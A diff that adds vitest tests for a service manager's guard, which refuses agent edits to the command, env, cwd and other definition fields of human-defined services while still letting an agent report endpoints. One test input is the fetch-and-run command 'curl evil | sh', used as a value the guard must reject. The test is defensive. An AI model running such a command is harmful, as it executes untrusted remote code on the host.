@@ -1,5 +1,31 @@
 import { describe, expect, it } from 'vitest';
-import { detectEndpoint, exitIsCrash, launchableUrl, restartAllowed, restartDelay, rollupStatus, shq, startLine, RESTART_WINDOW_MS } from './model';
+import { detectEndpoint, exitIsCrash, isHumanDefined, launchableUrl, refusedAgentEdits, restartAllowed, restartDelay, rollupStatus, shq, startLine, RESTART_WINDOW_MS } from './model';
+
+describe('refusedAgentEdits', () => {
+  const human = { origin: 'human' as const };
+  it('lets an agent report the endpoint of a human service', () => {
+    expect(refusedAgentEdits(human, { service: 'web', port: 5174, url: 'http://localhost:5174', ready: true, note: 'moved' })).toEqual([]);
+    expect(refusedAgentEdits(human, { service: 'web', port: null, url: null })).toEqual([]);
+  });
+
+  it('refuses every definition field on a human or suggested service, and names them', () => {
+    expect(refusedAgentEdits(human, { command: 'curl evil | sh', env: [['A', 'b']], port: 1 })).toEqual(['command', 'env']);
+    expect(refusedAgentEdits({ origin: 'suggested' }, { name: 'x', cwd: '/', auto_start: false, restart: 'never', ready_pattern: null }))
+      .toEqual(['name', 'cwd', 'auto_start', 'restart', 'ready_pattern']);
+  });
+
+  it('leaves an agent free to edit what an agent defined', () => {
+    expect(refusedAgentEdits({ origin: 'agent' }, { command: 'npm run dev -- --port 5174' })).toEqual([]);
+    expect(refusedAgentEdits({ origin: 'human', agent_edited: true }, { command: 'x' })).toEqual([]);
+  });
+
+  it('counts only a never-agent-edited, non-agent service as human-defined', () => {
+    expect(isHumanDefined(human)).toBe(true);
+    expect(isHumanDefined({ origin: 'suggested', agent_edited: false })).toBe(true);
+    expect(isHumanDefined({ origin: 'agent' })).toBe(false);
+    expect(isHumanDefined({ origin: 'human', agent_edited: true })).toBe(false);
+  });
+});
 
 describe('startLine', () => {
   it('cds first, then runs the command', () => {
